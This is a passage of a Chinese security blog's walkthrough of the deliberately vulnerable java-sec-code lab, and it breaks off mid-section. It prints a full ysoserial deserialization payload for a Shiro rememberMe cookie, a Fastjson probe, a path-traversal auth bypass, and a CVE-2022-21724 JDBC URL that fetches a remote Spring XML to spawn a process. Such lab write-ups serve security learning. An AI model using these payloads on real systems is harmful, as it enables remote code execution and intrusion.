~<span class="hljs-string">/ysoserial.jar</span> CommonsCollections5 calc | base64<br><br>rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YW<span class="hljs-keyword">ls</span>TWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dG<span class="hljs-keyword">ls</span>LkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZMamF2YS91dG<span class="hljs-keyword">ls</span>L0NvbGxlY3Rpb247eHBzcgATamF2YS51dG<span class="hljs-keyword">ls</span>LkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9MamF2YS91dG<span class="hljs-keyword">ls</span>L01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAACcHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQABGNhbGN0AARleGVjdXEAfgAyAAAAAXEAfgA3c3EAfgAnc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dG<span class="hljs-keyword">ls</span>Lkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4<br></code></pre></td></tr></table></figure><p>之后在 cookie 中加入payload：</p><p><strong>注意： rememberMe &#x3D; &lt;payload&gt;</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934983.png" alt="20250724132100840"></p><p>发包后会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934545.png" alt="20250724132234120"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934976.png" alt="20250724132330738"></p><h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h2><p>触发点:  JSON.parseObject()      JSON.parse()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080934865.png" alt="20250724134123264"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/fastjson&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson</span> &#123;<br><br>    <span class="hljs-meta">@RequestMapping(value = &quot;/deserialize&quot;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String params)</span> &#123;<br>        <span class="hljs-comment">// 如果Content-Type不设置application/json格式，post数据会被url编码</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 将post提交的string转换为json</span><br>            <span class="hljs-comment">//Fastjson 框架将字符串解析为 JSONObject 对象</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">ob</span> <span class="hljs-operator">=</span> JSON.parseObject(params);<br>            <span class="hljs-keyword">return</span> ob.get(<span class="hljs-string">&quot;name&quot;</span>).toString();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> e.toString();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><p>post 请求 &#x2F;fastjson&#x2F;deserialize ，传输 <strong>application&#x2F;json</strong> 格式数据</p><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;2jf0vy.dnslog.cn&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935795.png" alt="20250724135345425"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935897.png" alt="20250724135353947"></p><h2 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/file&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileUpload</span> &#123;<br><br>    <span class="hljs-comment">// Save the uploaded file to this folder</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">UPLOADED_FOLDER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">randomFilePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">// uplaod any file</span><br>    <span class="hljs-meta">@GetMapping(&quot;/any&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload&quot;</span>; <span class="hljs-comment">// return upload.html page</span><br>    &#125;<br><br>    <span class="hljs-comment">// only allow to upload pictures</span><br>    <span class="hljs-meta">@GetMapping(&quot;/pic&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadPic</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;uploadPic&quot;</span>; <span class="hljs-comment">// return uploadPic.html page</span><br>    &#125;<br><br>    <span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">singleFileUpload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span><br><span class="hljs-params">                                   RedirectAttributes redirectAttributes)</span> &#123;<br>        <span class="hljs-keyword">if</span> (file.isEmpty()) &#123;<br>            <span class="hljs-comment">// 赋值给uploadStatus.html里的动态参数message</span><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;Please select a file to upload&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// Get the file and save it somewhere</span><br>            <span class="hljs-type">byte</span>[] bytes = file.getBytes();<br>            <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());<br>            Files.write(path, bytes);<br><br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>,<br>                    <span class="hljs-string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            redirectAttributes.addFlashAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;upload failed&quot;</span>);<br>            logger.error(e.toString());<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/file/status&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>未对文件名、后缀名进行过滤，直接上传文件。</p><p><strong>漏洞利用：</strong></p><p>功能点：<a href="http://127.0.0.1:8081/file/any">http://127.0.0.1:8081/file/any</a> ，可以上传任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935394.png" alt="20250724141442245"></p><h2 id="GetRequestURI"><a href="#GetRequestURI" class="headerlink" title="GetRequestURI"></a>GetRequestURI</h2><blockquote><p>request.getRequestURL() 返回全路径</p><p>request.getRequestURI() 返回除去host（域名或者ip）部分的路径</p><p>request.getContextPath() 返回工程名部分，如果工程映射为&#x2F;，此处返回则为空</p><p>request.getServletPath() 返回除去host和工程名部分的路径</p><p>例如：</p><p>request.getRequestURL() <a href="http://localhost:8080/jqueryLearn/resources/request.jsp">http://localhost:8080/jqueryLearn/resources/request.jsp</a><br>request.getRequestURI() &#x2F;jqueryLearn&#x2F;resources&#x2F;request.jsp<br>request.getContextPath()&#x2F;jqueryLearn<br>request.getServletPath()&#x2F;resources&#x2F;request.jsp </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;uri&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetRequestURI</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/exclued/vuln&quot;)</span><br>    <span class="hljs-comment">//方法接收 HttpServletRequest 用于获取当前请求的 URI、路径等信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">exclued</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br><br>        <span class="hljs-comment">//若请求路径匹配 /css/** 和 /js/** 路径，就跳过登录</span><br>        String[] excluedPath = &#123;<span class="hljs-string">&quot;/css/**&quot;</span>, <span class="hljs-string">&quot;/js/**&quot;</span>&#125;;<br>        <span class="hljs-comment">//获取请求 URI</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI(); <span class="hljs-comment">// Security: request.getServletPath()</span><br>        <span class="hljs-type">PathMatcher</span> <span class="hljs-variable">matcher</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathMatcher</span>();<br><br>        <span class="hljs-comment">//打印 getRequestURI() 和 getServletPath() 的结果</span><br>        logger.info(<span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri);<br>        logger.info(<span class="hljs-string">&quot;getServletPath: &quot;</span> + request.getServletPath());<br><br>        <span class="hljs-comment">//遍历所有排除规则，如果当前请求 URI 匹配任意规则，则认为绕过登录校验</span><br>        <span class="hljs-keyword">for</span> (String path : excluedPath) &#123;<br>            <span class="hljs-keyword">if</span> (matcher.match(path, uri)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You have bypassed the login page.&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果请求路径不匹配排除规则，则返回提示页面是登录页。</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is a login page &gt;..&lt;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个奇怪的点：<code>@RequestMapping(&quot;uri&quot;)</code></p><p>注释中都没有加 <code>uri</code> ，如果不加 <code>uri</code> 下面的全部访问不到，但是 <code>getRequestURI() 返回除去 host（域名或者ip）部分的路径</code> 一定会包含  <code>uri</code> ，这就导致 <code>String[] excluedPath = {&quot;/css/**&quot;, &quot;/js/**&quot;};</code> 完全起不到作用，因为 <code>getRequestURI() </code>返回为 <code>/uri/...</code>，导致匹配不到 <code>&quot;/css/**&quot;, &quot;/js/**&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935768.png" alt="20250724151631951"></p><p>测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/testPath&quot;)</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">testPath</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>       <span class="hljs-comment">// 返回当前请求的完整路径 和 servletPath</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>       <span class="hljs-type">String</span> <span class="hljs-variable">servletPath</span> <span class="hljs-operator">=</span> request.getServletPath();<br>       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;getRequestURI: &quot;</span> + uri + <span class="hljs-string">&quot;\ngetServletPath: &quot;</span> + servletPath;<br>   &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080935368.png" alt="20250724152429560"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936550.png" alt="20250724152503479"></p><p>想要利用就改一下匹配规则：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span>[] excluedPath = &#123;<span class="hljs-string">&quot;/uri/css/**&quot;</span>, <span class="hljs-string">&quot;/uri/js/**&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936819.png" alt="20250724152945636"></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">poc:</span><br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span><span class="hljs-keyword">/exclued/</span>vuln<br><span class="hljs-keyword">/uri/</span>css/..<span class="hljs-punctuation">;</span>bypasswaf<span class="hljs-keyword">/exclued/</span>vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936089.png" alt="20250724153028787"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936309.png" alt="20250724153553391"></p><h2 id="jdbc-CVE-2022-21724"><a href="#jdbc-CVE-2022-21724" class="headerlink" title="jdbc-CVE 2022 21724"></a>jdbc-CVE 2022 21724</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080936646.png" alt="20250725111517628"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/jdbc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdbc</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * &lt;a href=&quot;https://github.com/JoyChou93/java-sec-code/wiki/CVE-2022-21724&quot;&gt;CVE-2022-21724&lt;/a&gt;</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/postgresql&quot;)</span><br>    <span class="hljs-comment">//接收 Base64 编码的 jdbcurl ，</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postgresql</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/db2&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">db2</span><span class="hljs-params">(String jdbcUrlBase64)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br>        <span class="hljs-type">byte</span>[] b = java.util.Base64.getDecoder().decode(jdbcUrlBase64);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jdbcUrl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(b);<br>        log.info(jdbcUrl);<br>        DriverManager.getConnection(jdbcUrl);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PostgreSQL JDBC 驱动支持通过 JDBC URL 中的参数 <code>socketFactory</code> 指定自定义类，用于创建 socket 连接。</p><p><strong>在漏洞版本中，这个类没有限制来源</strong>，攻击者可通过如下 URL 参数让其加载任意类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">socketFactory=<span class="hljs-tag">&lt;<span class="hljs-name">任意类</span>&gt;</span>&amp;socketFactoryArg=<span class="hljs-tag">&lt;<span class="hljs-name">任意参数</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Spring 环境中存在的 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 是一个典型的入口点，它可自动解析并执行外部 XML 配置。</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">jdbcUrlBase64=amRiYzpwb3N0Z3Jlc3FsOi8vMTI3LjAuMC4xOjU0MzIvdGVzdC8/c29ja2V0RmFjdG9yeT1vcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5DbGFzc1BhdGhYbWxBcHBsaWNhdGlvbkNvbnRleHQmc29ja2V0RmFjdG9yeUFyZz1odHRwOi8vdGVzdC5qb3ljaG91Lm9yZy8xLnhtbA==<br><br>jdbc:postgresql:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">5432</span><span class="hljs-regexp">/test/</span>?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http:<span class="hljs-regexp">//</span>test.joychou.org/<span class="hljs-number">1</span>.xml<br></code></pre></td></tr></table></figure><p><strong>socketFactory</strong> &#x3D; 使用了 Spring 的 <code>ClassPathXmlApplicationContext</code> 类</p><ul><li>该类在初始化时会加载并解析指定 URL 或文件的 Spring XML 配置。</li></ul><p><strong>socketFactoryArg</strong> &#x3D; 远程的 <code>1.xml</code></p><ul><li>这个 XML 是 Spring Bean 配置文件，包含了一个 <strong>ProcessBuilder</strong> Bean，启动本地程序。</li></ul><p>1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>open<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-a<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calculator<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-comment">&lt;!-- mac 中运行计算机；Linux 就是 /bin/sh，Windows 就是 cmd.exe--&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><blockquote><p>JSONP（JSON with Padding）是浏览器早期为了解决<strong>跨域请求数据</strong>的一种方法。它的基本原理是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/jsonp?callback=handleResponse&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>服务器返回的不是 JSON，而是：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&gt;<span class="hljs-function"><span class="hljs-title">handleResponse</span>(&#123;<span 